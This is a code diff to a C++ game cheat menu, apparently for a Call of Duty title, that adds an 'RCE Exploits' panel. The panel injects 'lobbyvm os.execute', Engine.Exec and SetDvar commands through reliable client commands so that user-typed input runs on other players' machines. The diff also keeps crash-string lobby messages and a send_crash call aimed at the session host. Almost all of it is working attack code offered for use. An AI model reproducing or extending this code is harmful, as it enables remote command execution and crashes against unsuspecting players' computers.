@@ -502,7 +502,7 @@ namespace menu
 
 						if (ImGui::MenuItem("Send crash text", nullptr, nullptr, session))
 						{
-							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "$(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)"); 
+							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "$(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)");
 							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^Baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
 							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^B");
 							steam::send_lobby_chat_message(session->lobbyData.platformSessionID, 0, "^H");
@@ -520,7 +520,50 @@ namespace menu
 							session && game::Live_IsUserSignedInToDemonware(0)))
 						{
 							exploit::send_crash(session->host.info.netAdr, session->host.info.xuid);
-							command::execute("@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+						}
+					}
+
+					if (ImGui::CollapsingHeader("RCE Exploits", ImGuiTreeNodeFlags_Leaf))
+					{
+						const auto set_dvar = [=](const std::string& dvar, const std::string& value)
+						{
+							const auto string = utils::string::va("lobbyvm Engine.SetDvar(str:%s,str:%s)", dvar, value);
+							game::CL_AddReliableCommand(0, string.data());
+						};
+
+						const auto execute_command = [=](const std::string& command)
+						{
+							const auto string = "lobbyvm Engine.Exec(int:0,str:\"" + command + "\")";
+							game::CL_AddReliableCommand(0, string.data());
+						};
+						
+						static auto rce_input{ ""s };
+						
+						ImGui::SetNextItemWidth(width * 0.60f);
+						ImGui::InputTextWithHint("##rce_input", "RCE Input", &rce_input); 
+						
+						if (selectable("Execute command line", in_game))
+						{
+							const auto string = "lobbyvm os.execute(str:\"" + rce_input + "\")";
+							game::CL_AddReliableCommand(0, string.data());
+						}
+
+						if (selectable("Execute cbuf command", in_game))
+						{
+							execute_command(rce_input);
+						}
+
+						if (selectable("Set dvar", in_game))
+						{
+							if (const auto args = utils::string::split(rce_input, ' '); args.size() > 1)
+							{
+								set_dvar(args[0], args[1]);
+							}
+						}
+
+						if (selectable("Fast restart", in_game))
+						{
+							execute_command("fast_restart");
 						}
 					}
 					
@@ -543,6 +586,21 @@ namespace menu
 							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
 							{
 								command::execute(command_input);
+							}
+						}
+
+						if (begin_section("Execute reliable command"))
+						{
+							static auto reliable_command_input = ""s;
+
+							ImGui::SetNextItemWidth(width * 0.85f);
+							ImGui::InputTextWithHint("##reliable_command_input", "Reliable Command", &reliable_command_input);
+
+							ImGui::SameLine();
+
+							if (ImGui::Button("Execute##execute_reliable_command", { 64.0f, 0.0f }))
+							{
+								game::CL_AddReliableCommand(0, reliable_command_input.data());
 							}
 						}
 
